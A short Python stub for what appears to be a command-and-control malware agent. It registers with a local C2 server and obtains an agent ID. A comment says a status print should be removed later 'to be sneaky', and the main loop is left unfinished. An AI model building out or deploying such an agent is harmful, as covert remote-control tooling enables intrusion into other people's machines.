import requests
import subprocess

BASE_URL = "http://127.0.0.1:8000"

def register_agent():
    """
    Registers a new agent on the server and get back an unique user_id
    """
    request = requests.get(f"{BASE_URL}/api/v1/agent/register")
    agent_id = request.json()["agent_id"]

    print(f"Successfully connected to C2. Agent ID: {agent_id}") #useful for testing but to remove on real condition to be sneaky

    return agent_id

def main():
    """
    This main loop will :
    - Register a new agent
    - ...
    """
    #agent_id = register_agent()
    register_agent()

if __name__ == "__main__":
    main()